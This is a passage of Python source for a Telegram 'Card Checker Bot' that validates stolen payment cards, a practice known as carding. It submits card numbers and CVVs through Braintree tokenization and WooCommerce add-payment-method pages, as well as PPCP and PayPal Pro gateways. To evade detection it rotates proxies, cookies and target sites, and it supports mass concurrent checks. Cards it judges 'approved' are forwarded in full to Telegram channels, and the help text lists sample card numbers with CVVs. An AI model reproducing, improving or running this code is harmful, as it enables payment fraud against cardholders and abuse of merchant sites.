            if pattern in result:
                return "APPROVED", "Approved", True

        # Check if the extracted reason matches CVV patterns
        for pattern in cvv_patterns:
            if pattern in reason_part:
                return "APPROVED", "Approved", True

        # Return the extracted reason for declined cards
        return "DECLINED", reason_part, False

    # If "Reason:" is not found, use the original logic
    approved_patterns = [
        'Nice! New payment method added',
        'Payment method successfully added.',
        'Insufficient Funds',
        'Gateway Rejected: avs',
        'Duplicate',
        'Payment method added successfully',
        'Invalid postal code or street address',
        'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
    ]

    cvv_patterns = [
        'Reason: CVV',
        'Gateway Rejected: avs_and_cvv',
        'Card Issuer Declined CVV',
        'Gateway Rejected: cvv'
    ]

    for pattern in approved_patterns:
        if pattern in result:
            return "APPROVED", "Approved", True

    for pattern in cvv_patterns:
        if pattern in result:
            return "APPROVED", "Approved", True

    return "DECLINED", result, False

def normalize_card_format(card_input):
    """
    Normalize card format to number|mm|yy|cvv
    Supports:
    - 5401683112957490|10|2029|741 (pipe-separated)
    - 4284303806640816 0628 116 (space-separated with mmyy)
    """
    card_input = card_input.strip()
    
    # Check if already in pipe format
    if '|' in card_input:
        parts = card_input.split('|')
        if len(parts) == 4:
            number, mm, yy, cvv = parts
            # Normalize year to 4 digits
            if len(yy) == 2:
                yy = '20' + yy
            return f"{number}|{mm}|{yy}|{cvv}"
        return None
    
    # Handle space-separated format: number mmyy cvv
    parts = card_input.split()
    if len(parts) == 3:
        number, mmyy, cvv = parts
        if len(mmyy) == 4:
            mm = mmyy[:2]
            yy = '20' + mmyy[2:]
            return f"{number}|{mm}|{yy}|{cvv}"
    
    return None

def check_card(cc_line):
    """Check card with thread-safe resource selection"""
    from datetime import datetime
    start_time = time.time()

    try:
        # Select random site folder (thread-safe, per-request)
        site_folder = select_random_site()
        
        # Select new cookie pair for this card check (thread-safe, per-request)
        cookie_pair = select_new_cookie_pair_silent(site_folder)
        
        # Select random proxy (thread-safe, per-request)
        proxy_string = select_random_proxy(site_folder)
        
        # Get domain URL and cookies (thread-safe)
        domain_url = get_domain_url(site_folder)
        cookies_2 = get_cookies_2(cookie_pair)
        headers = get_headers(domain_url)
        
        # Get authorization (thread-safe)
        add_nonce, au, error_type = get_new_auth(site_folder, cookie_pair, proxy_string)
        if not add_nonce or not au:
            site_name = site_folder or "Unknown site"
            return "❌ Authorization failed. Try again later.", error_type, site_name

        # Parse card details with error handling
        try:
            parts = cc_line.strip().split('|')
            if len(parts) != 4:
                return "❌ Invalid card format. Expected: number|mm|yy|cvv", 'invalid_format', None
            n, mm, yy, cvc = parts
        except Exception as e:
            return f"❌ Error parsing card: {str(e)}", 'parse_error', None
        
        if not yy.startswith('20'):
            yy = '20' + yy

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'cc600ecf-f0e1-4316-ac29-7ad78aeafccd',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                        'billingAddress': {
                            'postalCode': '10080',
                            'streetAddress': '147 street',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        headers_token = {
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'user-agent': user
        }

        proxy = get_random_proxy(proxy_string)
        response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers_token,
            json=json_data,
            proxies=proxy,
            verify=False
        )

        if response.status_code != 200:
            site_name = site_folder or "Unknown site"
            return f"❌ Tokenization failed. Status: {response.status_code}", 'tokenization_error', site_name

        # Parse token with error handling
        try:
            response_data = response.json()
            token = response_data['data']['tokenizeCreditCard']['token']
        except (KeyError, ValueError) as e:
            site_name = site_folder or "Unknown site"
            return f"❌ Failed to extract token from response: {str(e)}", 'token_extraction_error', site_name

        headers_submit = headers.copy()
        headers_submit['content-type'] = 'application/x-www-form-urlencoded'

        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '{"correlation_id":"cc600ecf-f0e1-4316-ac29-7ad78aea"}',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        proxy = get_random_proxy(proxy_string)
        response = requests.post(
            f'{domain_url}/my-account/add-payment-method/',
            cookies=cookies_2,  # Use fresh cookies
            headers=headers,
            data=data,
            proxies=proxy,
            verify=False
        )

        elapsed_time = time.time() - start_time
        soup = BeautifulSoup(response.text, 'html.parser')
        error_div = soup.find('div', class_='woocommerce-notices-wrapper')
        message = error_div.get_text(strip=True) if error_div else "❌ Unknown error"

        status, reason, approved = check_status(message)
        bin_info = get_bin_info(n[:6]) or {}

        print(f"DEBUG: Emoji in response: {bin_info.get('emoji', '🏳️')}")  # Debug print emoji
        response_text = f"""
{status} {'❌' if not approved else '✅'}

𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {reason}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB
"""
        return response_text, None, None

    except Exception as e:
        return f"❌ Error: {str(e)}", None, None


async def check_ppcp_mass_cards(card_list, site_urls, max_concurrent=10):
    """Check multiple cards using async PPCP gateway with controlled concurrency"""
    try:
        from ppcp.async_ppcpgatewaycvv import check_multiple_cards
        results = await check_multiple_cards(card_list, site_urls, max_concurrent)
        return results
    except Exception as e:
        return [f"❌ Error in mass check: {str(e)}"] * len(card_list)


async def check_ppcp_cards_streaming(card_list, site_urls, on_result_callback, max_concurrent=10):
    """
    Check multiple cards using async PPCP gateway with streaming results.
    Each result is sent immediately via the callback.
    
    Args:
        card_list: List of cards to check
        site_urls: List of site URLs
        on_result_callback: Async callback function(index, card, result)
        max_concurrent: Maximum concurrent checks
        
    Returns:
        Summary dict with counts
    """
    try:
        from ppcp.async_ppcpgatewaycvv import check_cards_with_immediate_callback
        summary = await check_cards_with_immediate_callback(
            card_list, 
            site_urls, 
            on_result_callback, 
            max_concurrent
        )
        return summary
    except Exception as e:
        # Fallback: send error for each card
        for i, card in enumerate(card_list):
            await on_result_callback(i, card, f"❌ Error in mass check: {str(e)}")
        return {
            'total': len(card_list),
            'approved': 0,
            'declined': 0,
            'errors': len(card_list)
        }


# ============= TELEGRAM BOT HANDLERS =============

async def forward_to_channel(context: ContextTypes.DEFAULT_TYPE, card_details: str, result: str, gateway='b3'):
    """Forward approved card to the configured channel and all enabled forwarders"""
    # Check if the result indicates an approved card
    # For auth gateway: "APPROVED" and "✅"
    # For PPCP gateway: "CCN" or "CVV" with "✅"
    is_approved = ("APPROVED" in result and "✅" in result) or \
                  ("CCN" in result and "✅" in result) or \
                  ("CVV" in result and "✅" in result)
    
    if not is_approved:
        return
    
    # Forward to default channel if configured
    if FORWARD_CHANNEL_ID is not None:
        try:
            await context.bot.send_message(
                chat_id=FORWARD_CHANNEL_ID,
                text=result,
                parse_mode=None
            )
            print(f"✅ Forwarded approved card to default channel: {FORWARD_CHANNEL_ID}")
        except Exception as e:
            print(f"❌ Error forwarding to default channel: {str(e)}")
    
    # Forward to all enabled forwarders for this gateway
    forwarders = get_forwarders(gateway)
    for forwarder in forwarders:
        if not forwarder.get('enabled', True):
            continue
        
        try:
            # Create a temporary bot instance for this forwarder
            import aiohttp
            url = f"https://api.telegram.org/bot{forwarder['bot_token']}/sendMessage"
            data = {
                'chat_id': forwarder['chat_id'],
                'text': result
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(url, data=data, timeout=10) as response:
                    if response.status == 200:
                        print(f"✅ Forwarded to forwarder '{forwarder['name']}' (chat: {forwarder['chat_id']})")
                    else:
                        print(f"❌ Failed to forward to forwarder '{forwarder['name']}': HTTP {response.status}")
        except Exception as e:
            print(f"❌ Error forwarding to forwarder '{forwarder['name']}': {str(e)}")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /status command - show active mass checks (admin only)"""
    user_id = update.effective_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await update.message.reply_text("❌ This command is only available to admins and mods.")
        return
    
    with active_mass_checks_lock:
        if not active_mass_checks:
            await update.message.reply_text("📊 No active mass checks currently running.")
            return
        
        status_text = "📊 **Active Mass Checks:**\n\n"
        for uid, info in active_mass_checks.items():
            elapsed = time.time() - info['started']
            status_text += f"• User ID: `{uid}`\n"
            status_text += f"  Cards: {info['total_cards']}\n"
            status_text += f"  Running: {elapsed:.1f}s\n\n"
        
        status_text += f"Total active: {len(active_mass_checks)}/{MAX_TOTAL_CONCURRENT_MASS_CHECKS}"
        
        await update.message.reply_text(status_text, parse_mode='Markdown')


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "User"
    first_name = update.effective_user.first_name or "User"
    
    # Check if user is admin and show admin commands
    is_admin = user_id == ADMIN_ID
    
    # Check for custom start message
    custom_message = get_start_message()
    
    if custom_message:
        # Use custom start message with placeholder replacement
        welcome_message = custom_message.replace('{username}', username)
        welcome_message = welcome_message.replace('{user_id}', str(user_id))
        welcome_message = welcome_message.replace('{first_name}', first_name)
    else:
        # Use default start message
        welcome_message = f"""
👋 Welcome to the Card Checker Bot, @{username}!

🔐 To use this bot, you need admin approval.

📝 Your User ID: `{user_id}`

Please contact @TUMAOB to get access.

Commands:
/start - Show this message
/b3 <card> - Check a single card (Braintree Auth)
/b3s <cards> - Check multiple cards (Braintree Auth)
/pp <card/cards> - Check single or multiple cards (PPCP Gateway)
/pro <card/cards> - Check single or multiple cards (PayPal Pro Gateway)
"""
    
    if is_admin:
        welcome_message += """
**Admin Commands:**
/admin - Open admin control panel
/approve <user_id> - Approve a user
/remove <user_id> - Remove a user
/status - View active mass checks
"""
    
    # Only add examples if using default message
    if not custom_message:
        welcome_message += """
Single Card Examples:
/b3 5156123456789876|11|29|384
/pp 4315037547717888|10|28|852
/pro 4315037547717888|10|28|852

Mass Check Examples:
/b3s 5401683112957490|10|2029|741
4386680119536105|01|2029|147
4284303806640816 0628 116

/pp 5401683112957490|10|2029|741
4386680119536105|01|2029|147

/pro 5401683112957490|10|2029|741
4386680119536105|01|2029|147
4000223361770415|04|2029|639

Supported formats:
- number|mm|yy|cvv
- number mmyy cvv
"""
    
    await update.message.reply_text(welcome_message, parse_mode='Markdown')

async def b3_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /b3 command for card checking with rate limiting"""
    user_id = update.effective_user.id

    # Check if user is admin
    if user_id == ADMIN_ID:
        pass  # Admin always has access
    elif not is_user_approved(user_id):
        await update.message.reply_text(
            "❌ You don't have access to use this bot.\n"
            f"Your User ID: `{user_id}`\n\n"
            "Please contact @TUMAOB for approval.",
            parse_mode='Markdown'
        )
        return

    # Rate limiting check (thread-safe)
    with user_rate_limit_lock:
        current_time = time.time()
        last_check_time = user_rate_limit.get(user_id, 0)
        time_since_last_check = current_time - last_check_time
        
        if time_since_last_check < RATE_LIMIT_SECONDS:
            wait_time = RATE_LIMIT_SECONDS - time_since_last_check
            await update.message.reply_text(
                f"⏳ Please wait {wait_time:.1f} seconds before checking another card.\n"
                "This prevents overloading the system."
            )
            return
        
        # Update last check time
        user_rate_limit[user_id] = current_time

    # Check if card details are provided
    if not context.args:
        await update.message.reply_text(
            "❌ Please provide card details.\n\n"
            "Format: /b3 number|mm|yy|cvv\n"
            "Example: /b3 5156123456789876|11|29|384"
        )
        return

    card_details = ' '.join(context.args)

    # Validate card format
    if card_details.count('|') != 3:
        await update.message.reply_text(
            "❌ Invalid card format.\n\n"
            "Format: /b3 number|mm|yy|cvv\n"
            "Example: /b3 5156123456789876|11|29|384"
        )
        return

    # Send "Checking Please Wait" message
    checking_msg = await update.message.reply_text("⏳ Checking Please Wait...")

    # Check the card
    result, error_type, site_name = check_card(card_details)

    # Edit the message with the result
    await checking_msg.edit_text(result)
    
    # Forward to channel if approved
    await forward_to_channel(context, card_details, result, gateway='b3')

    # Handle error notifications
    if error_type:
        # Send message to admin
        admin_message = f"⚠️ Site Error Detected!\n\nSite: {site_name}\nError Type: {error_type}\nChecked by: @{update.effective_user.username or 'Unknown'} (ID: {user_id})\n\nPlease fix the issue."
        try:
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_message)
        except Exception as e:
            print(f"❌ Failed to send admin notification: {str(e)}")

        # Send message to user
        user_message = "ERROR"
        await update.message.reply_text(user_message)

    # Check if card is approved and forward to channel
    if CHANNEL_ID and "APPROVED" in result:
        try:
            # Extract card details for forwarding
            n, mm, yy, cvc = card_details.strip().split('|')
            masked_card = f"{n[:6]}xxxxxx{n[-4:]}|{mm}|{yy}|{cvc}"

            forward_message = f"""🎉 **APPROVED CARD DETECTED!**

𝗖𝗖 ⇾ `{masked_card}`
𝗚𝗮𝘁𝗲𝘄𝗮𝘺 ⇾ Braintree Auth

Checked by: @{update.effective_user.username or 'Unknown'} (ID: `{user_id}`)

#Approved #CC #Braintree"""

            await context.bot.send_message(
                chat_id=CHANNEL_ID,
                text=forward_message,
                parse_mode='Markdown'
            )
            print(f"✅ Approved card forwarded to channel: {CHANNEL_ID}")
        except Exception as e:
            print(f"❌ Failed to forward approved card to channel: {str(e)}")
            # Don't notify user about forwarding failure to avoid spam

async def b3s_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /b3s command for mass card checking - optimized to not block admin commands"""
    user_id = update.effective_user.id
    is_admin = user_id == ADMIN_ID

    # Check if user is admin or approved
    if not is_admin and not is_user_approved(user_id):
        await update.message.reply_text(
            "❌ You don't have access to use this bot.\n"
            f"Your User ID: `{user_id}`\n\n"
            "Please contact @TUMAOB for approval.",
            parse_mode='Markdown'
        )
        return
    
    # Check if mass checking is enabled for B3
    if not is_mass_enabled('b3'):
        await update.message.reply_text(
            "❌ Mass checking is currently disabled for B3 gateway.\n\n"
            "Please use /b3 for single card checking or contact admin.",
            parse_mode='Markdown'
        )
        return

    # Check if card details are provided
    if not context.args:
        await update.message.reply_text(
            "❌ Please provide card details.\n\n"
            "Format: /b3s <cards>\n"
            "Examples:\n"
            "/b3s 5401683112957490|10|2029|741\n"
            "4386680119536105|01|2029|147\n"
            "4284303806640816 0628 116\n\n"
            "You can send multiple cards, one per line."
        )
        return

    # Parse cards from message (support multiline input)
    message_text = update.message.text
    # Remove the /b3s command
    cards_text = message_text.replace('/b3s', '', 1).strip()

    # Split by newlines to get individual cards
    card_lines = [line.strip() for line in cards_text.split('\n') if line.strip()]

    if not card_lines:
        await update.message.reply_text(
            "❌ No valid cards found.\n\n"
            "Format: /b3s <cards>\n"
            "Examples:\n"
            "/b3s 5401683112957490|10|2029|741\n"
            "4386680119536105|01|2029|147\n"
            "4284303806640816 0628 116"
        )
        return

    # Normalize all cards
    normalized_cards = []
    for card_line in card_lines:
        normalized = normalize_card_format(card_line)
        if normalized:
            normalized_cards.append(normalized)
        else:
            await update.message.reply_text(
                f"❌ Invalid card format: {card_line}\n\n"
                "Supported formats:\n"
                "- number|mm|yy|cvv\n"
                "- number mmyy cvv"
            )
            return

    total_cards = len(normalized_cards)

    # Check if user can start a mass check (prevents single user from blocking system)
    can_start, error_msg = can_start_mass_check(user_id)
    if not can_start:
        await update.message.reply_text(f"⏳ {error_msg}")
        return

    # Register this mass check
    register_mass_check(user_id, total_cards)

    # Send initial status message
    status_msg = await update.message.reply_text(
        f"⏳ Checking {total_cards} card(s)...\n"
        f"Progress: 0/{total_cards}"
    )

    try:
        # Process each card with yielding to event loop
        approved_count = 0
        declined_count = 0

        for idx, card in enumerate(normalized_cards, 1):
            # Yield to event loop to allow other commands to process
            # This is the key optimization - allows admin commands to run
            await asyncio.sleep(0)  # Yield control to event loop
            
            # Rate limiting for non-admin users (between cards in mass check)
            if not is_admin and idx > 1:
                with user_rate_limit_lock:
                    current_time = time.time()
                    last_check_time = user_rate_limit.get(user_id, 0)
                    time_since_last_check = current_time - last_check_time

                    if time_since_last_check < RATE_LIMIT_SECONDS:
                        wait_time = RATE_LIMIT_SECONDS - time_since_last_check
                        await asyncio.sleep(wait_time)

                    # Update last check time
                    user_rate_limit[user_id] = time.time()

            # Check the card using run_in_executor to not block event loop
            loop = asyncio.get_event_loop()
            result, error_type, site_name = await loop.run_in_executor(None, check_card, card)

            # Count approved/declined
            if "APPROVED" in result and "✅" in result:
                approved_count += 1
                # Forward to channel if approved
                await forward_to_channel(context, card, result, gateway='b3')
            else:
                declined_count += 1

            # Send result immediately after checking
            card_result = f"Card {idx}/{total_cards}:\n{result}"
            await update.message.reply_text(card_result)

            # Update progress every card
            try:
                await status_msg.edit_text(
                    f"⏳ Checking {total_cards} card(s)...\n"
                    f"Progress: {idx}/{total_cards}\n"
                    f"✅ Approved: {approved_count} | ❌ Declined: {declined_count}"
                )
            except:
                pass  # Ignore edit errors (e.g., message not modified)

            # Handle error notifications
            if error_type:
                admin_message = f"⚠️ Site Error Detected!\n\nSite: {site_name}\nError Type: {error_type}\nChecked by: @{update.effective_user.username or 'Unknown'} (ID: {user_id})\n\nPlease fix the issue."
                try:
                    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_message)
                except Exception as e:
                    print(f"❌ Failed to send admin notification: {str(e)}")

        # Send final summary
        summary = f"📊 Mass Check Complete\n\n"
        summary += f"Total Cards: {total_cards}\n"
        summary += f"✅ Approved: {approved_count}\n"
        summary += f"❌ Declined: {declined_count}"

        await update.message.reply_text(summary)

        # Delete the progress message
        try:
            await status_msg.delete()
        except:
            pass
    finally:
        # Always unregister the mass check when done
        unregister_mass_check(user_id)


async def pp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /pp command for ppcp gateway checking with rate limiting and mass checking support - optimized to not block admin commands"""
    user_id = update.effective_user.id
    is_admin = user_id == ADMIN_ID

    # Check if user is admin or approved
    if not is_admin and not is_user_approved(user_id):
        await update.message.reply_text(
            "❌ You don't have access to use this bot.\n"
            f"Your User ID: `{user_id}`\n\n"
            "Please contact @TUMAOB for approval.",
            parse_mode='Markdown'
        )
        return

    # Check if card details are provided
    if not context.args:
        await update.message.reply_text(
            "❌ Please provide card details.\n\n"
            "Single Card Format: /pp number|mm|yy|cvv\n"
            "Mass Check Format:\n/pp 5401683112957490|10|2029|741\n4386680119536105|01|2029|147\n4000223361770415|04|2029|639"
        )
        return

    # Parse cards from message (support multiline input)
    message_text = update.message.text
    # Remove the /pp command
    cards_text = message_text.replace('/pp', '', 1).strip()

    # Split by newlines to get individual cards
    card_lines = [line.strip() for line in cards_text.split('\n') if line.strip()]

    if not card_lines:
        await update.message.reply_text(
            "❌ No valid cards found.\n\n"
            "Format:\n"
            "Single: /pp number|mm|yy|cvv\n"
            "Mass: /pp 5401683112957490|10|2029|741\n4386680119536105|01|2029|147"
        )
        return

    # Normalize all cards
    normalized_cards = []
    for card_line in card_lines:
        # Import ppcp module dynamically
        from ppcp import ppcpgatewaycvv
        normalized = ppcpgatewaycvv.normalize_card_format(card_line)
        if normalized:
            normalized_cards.append(normalized)
        else:
            await update.message.reply_text(
                f"❌ Invalid card format: {card_line}\n\n"
                "Supported formats:\n"
                "- number|mm|yy|cvv\n"
                "- number mmyy cvv"
            )
            return

    total_cards = len(normalized_cards)

    # Handle single card vs mass checking
    if total_cards == 1:
        # Single card - apply rate limiting for non-admin users
        if not is_admin:
            with user_rate_limit_lock:
                current_time = time.time()
                last_check_time = user_rate_limit.get(user_id, 0)
                time_since_last_check = current_time - last_check_time

                if time_since_last_check < RATE_LIMIT_SECONDS:
                    wait_time = RATE_LIMIT_SECONDS - time_since_last_check
                    await update.message.reply_text(
                        f"⏳ Please wait {wait_time:.1f} seconds before checking another card.\n"
                        "This prevents overloading the system."
                    )
                    return

                # Update last check time
                user_rate_limit[user_id] = current_time

        # Send "Checking Please Wait" message
        checking_msg = await update.message.reply_text("⏳ Checking Please Wait...")

        try:
            # Check the single card using async ppcp gateway
            # Load sites from sites.txt file
            sites = []
            if os.path.exists('ppcp/sites.txt'):
                with open('ppcp/sites.txt', 'r') as f:
                    sites = [line.strip() for line in f if line.strip()]
            else:
                # Load from the project root if ppcp folder is not present in the path
                if os.path.exists('sites.txt'):
                    with open('sites.txt', 'r') as f:
                        sites = [line.strip() for line in f if line.strip()]

            if not sites:
                result = "❌ No sites found!"
            else:
                from ppcp.async_ppcpgatewaycvv import check_single_card
                result = await check_single_card(normalized_cards[0], sites)

            # Edit the message with the result
            await checking_msg.edit_text(result)

            # Forward to channel if approved
            await forward_to_channel(context, normalized_cards[0], result, gateway='pp')

        except Exception as e:
            error_message = f"❌ Error checking card: {str(e)}"
            await checking_msg.edit_text(error_message)
            print(f"Error in /pp command: {str(e)}")

    else:
        # Mass checking with STREAMING results - each result sent immediately as it completes
        # Check if mass checking is enabled for PP
        if not is_mass_enabled('pp'):
            await update.message.reply_text(
                "❌ Mass checking is currently disabled for PP (PPCP) gateway.\n\n"
                "Please use /pp for single card checking or contact admin.",
                parse_mode='Markdown'
            )
            return
        
        # Check if user can start a mass check (prevents single user from blocking system)
        can_start, error_msg = can_start_mass_check(user_id)
        if not can_start:
            await update.message.reply_text(f"⏳ {error_msg}")
            return

        # Register this mass check
        register_mass_check(user_id, total_cards)

        # Send initial status message
        status_msg = await update.message.reply_text(
            f"⏳ Checking {total_cards} card(s)...\n"
            f"Progress: 0/{total_cards}"
        )

        try:
            # Load sites from sites.txt file
            sites = []
            if os.path.exists('ppcp/sites.txt'):
                with open('ppcp/sites.txt', 'r') as f:
                    sites = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            else:
                # Load from the project root if ppcp folder is not present in the path
                if os.path.exists('sites.txt'):
                    with open('sites.txt', 'r') as f:
                        sites = [line.strip() for line in f if line.strip() and not line.startswith('#')]

            if not sites:
                await status_msg.edit_text("❌ No sites found!")
                return

            # Track progress for streaming results
            approved_count = 0
            declined_count = 0
            completed_count = 0
            
            # Define callback to send each result IMMEDIATELY as it completes
            async def on_card_result(index, card, result):
                nonlocal approved_count, declined_count, completed_count
                
                # Yield to event loop to allow other commands to process
                await asyncio.sleep(0)
                
                completed_count += 1
                
                # Count approved/declined
                if ("CCN" in result and "✅" in result) or ("CVV" in result and "✅" in result):
                    approved_count += 1
                    # Forward to channel if approved
                    await forward_to_channel(context, card, result, gateway='pp')
                else:
                    declined_count += 1

                # Send result IMMEDIATELY
                card_result = f"Card {completed_count}/{total_cards}:\n{result}"
                await update.message.reply_text(card_result)

                # Update progress
                try:
                    await status_msg.edit_text(
                        f"⏳ Checking {total_cards} card(s)...\n"
                        f"Progress: {completed_count}/{total_cards}\n"
                        f"✅ Approved: {approved_count} | ❌ Declined: {declined_count}"
                    )
                except:
                    pass  # Ignore edit errors

            # Check all cards with STREAMING results (10 concurrent)
            summary = await check_ppcp_cards_streaming(
                normalized_cards, 
                sites, 
                on_card_result, 
                max_concurrent=10
            )

            # Send final summary
            final_summary = f"📊 Mass Check Complete\n\n"
            final_summary += f"Total Cards: {total_cards}\n"
            final_summary += f"✅ Approved: {summary.get('approved', approved_count)}\n"
            final_summary += f"❌ Declined: {summary.get('declined', declined_count)}"
            
            if summary.get('errors', 0) > 0:
                final_summary += f"\n⚠️ Errors: {summary.get('errors', 0)}"

            await update.message.reply_text(final_summary)

            # Delete the progress message
            try:
                await status_msg.delete()
            except:
                pass
        finally:
            # Always unregister the mass check when done
            unregister_mass_check(user_id)


async def pro_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /pro command for PayPal Pro gateway checking with rate limiting and mass checking support - optimized to not block admin commands"""
    user_id = update.effective_user.id
    is_admin = user_id == ADMIN_ID

    # Check if user is admin or approved
    if not is_admin and not is_user_approved(user_id):
        await update.message.reply_text(
            "❌ You don't have access to use this bot.\n"
            f"Your User ID: `{user_id}`\n\n"
            "Please contact @TUMAOB for approval.",
            parse_mode='Markdown'
        )
        return

    # Check if card details are provided
    if not context.args:
        await update.message.reply_text(
            "❌ Please provide card details.\n\n"
            "Single Card Format: /pro number|mm|yy|cvv\n"
            "Mass Check Format:\n/pro 5401683112957490|10|2029|741\n4386680119536105|01|2029|147\n4000223361770415|04|2029|639"
        )
        return

    # Parse cards from message (support multiline input)
    message_text = update.message.text
    # Remove the /pro command
    cards_text = message_text.replace('/pro', '', 1).strip()

    # Split by newlines to get individual cards
    card_lines = [line.strip() for line in cards_text.split('\n') if line.strip()]

    if not card_lines:
        await update.message.reply_text(
            "❌ No valid cards found.\n\n"
            "Format:\n"
            "Single: /pro number|mm|yy|cvv\n"
            "Mass: /pro 5401683112957490|10|2029|741\n4386680119536105|01|2029|147"
        )
        return

    # Import PayPal Pro module
    try:
        from paypalpro import paypalpro
    except ImportError:
        sys.path.append(os.path.join(os.path.dirname(__file__), 'paypalpro'))
        from paypalpro import paypalpro

    # Normalize all cards
    normalized_cards = []
    for card_line in card_lines:
        normalized = paypalpro.normalize_card_format(card_line)
        if normalized:
            normalized_cards.append(normalized)
        else:
            await update.message.reply_text(
                f"❌ Invalid card format: {card_line}\n\n"
                "Supported formats:\n"
                "- number|mm|yy|cvv\n"
                "- number mmyy cvv"
            )
            return

    total_cards = len(normalized_cards)

    # Load sites from paypalpro/sites.txt
    sites = paypalpro.load_sites()
    if not sites:
        await update.message.reply_text("❌ No PayPal Pro sites configured! Please add sites to paypalpro/sites.txt")
        return

    # Handle single card vs mass checking
    if total_cards == 1:
        # Single card - apply rate limiting for non-admin users
        if not is_admin:
            with user_rate_limit_lock:
                current_time = time.time()
                last_check_time = user_rate_limit.get(user_id, 0)
                time_since_last_check = current_time - last_check_time

                if time_since_last_check < RATE_LIMIT_SECONDS:
                    wait_time = RATE_LIMIT_SECONDS - time_since_last_check
                    await update.message.reply_text(
                        f"⏳ Please wait {wait_time:.1f} seconds before checking another card.\n"
                        "This prevents overloading the system."
                    )
                    return

                # Update last check time
                user_rate_limit[user_id] = current_time

        # Send "Checking Please Wait" message
        checking_msg = await update.message.reply_text("⏳ Checking Please Wait... (PayPal Pro)")

        try:
            # Check the single card using PayPal Pro gateway (run in executor to not block)
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(None, lambda: paypalpro.check_card(normalized_cards[0], sites=sites))
            formatted_result = paypalpro.format_result(result)

            # Edit the message with the result
            await checking_msg.edit_text(formatted_result)

            # Forward to channel if approved
            if result.get('approved', False):
                await forward_to_channel(context, normalized_cards[0], formatted_result, gateway='ppro')

        except Exception as e:
            error_message = f"❌ Error checking card: {str(e)}"
            await checking_msg.edit_text(error_message)
            print(f"Error in /pro command: {str(e)}")

    else:
        # Mass checking
        # Check if mass checking is enabled for PPRO
        if not is_mass_enabled('ppro'):
            await update.message.reply_text(
                "❌ Mass checking is currently disabled for PPRO (PayPal Pro) gateway.\n\n"
                "Please use /pro for single card checking or contact admin.",
                parse_mode='Markdown'
            )
            return
        
        # Check if user can start a mass check (prevents single user from blocking system)
        can_start, error_msg = can_start_mass_check(user_id)
        if not can_start:
            await update.message.reply_text(f"⏳ {error_msg}")
            return

        # Register this mass check
        register_mass_check(user_id, total_cards)

        # Send initial status message
        status_msg = await update.message.reply_text(
            f"⏳ Checking {total_cards} card(s) via PayPal Pro...\n"
            f"Progress: 0/{total_cards}"
        )

        try:
            # Track progress
            approved_count = 0
            declined_count = 0

            for idx, card in enumerate(normalized_cards, 1):
                # Yield to event loop to allow other commands to process
                await asyncio.sleep(0)
                
                # Rate limiting for non-admin users (between cards in mass check)
                if not is_admin and idx > 1:
                    with user_rate_limit_lock:
                        current_time = time.time()
                        last_check_time = user_rate_limit.get(user_id, 0)
                        time_since_last_check = current_time - last_check_time

                        if time_since_last_check < RATE_LIMIT_SECONDS:
                            wait_time = RATE_LIMIT_SECONDS - time_since_last_check
                            await asyncio.sleep(wait_time)

                        # Update last check time
                        user_rate_limit[user_id] = time.time()

                try:
                    # Check the card using run_in_executor to not block event loop
                    loop = asyncio.get_event_loop()
                    result = await loop.run_in_executor(None, lambda c=card: paypalpro.check_card(c, sites=sites))
                    formatted_result = paypalpro.format_result(result)

                    # Count approved/declined
                    if result.get('approved', False):
                        approved_count += 1
                        # Forward to channel if approved
                        await forward_to_channel(context, card, formatted_result, gateway='ppro')
                    else:
                        declined_count += 1

                    # Send result immediately after checking
                    card_result = f"Card {idx}/{total_cards}:\n{formatted_result}"
                    await update.message.reply_text(card_result)

                except Exception as e:
                    declined_count += 1
                    await update.message.reply_text(f"Card {idx}/{total_cards}:\n❌ Error: {str(e)}")

                # Update progress
                try:
                    await status_msg.edit_text(
                        f"⏳ Checking {total_cards} card(s) via PayPal Pro...\n"
                        f"Progress: {idx}/{total_cards}\n"
                        f"✅ Approved: {approved_count} | ❌ Declined: {declined_count}"
                    )
                except:
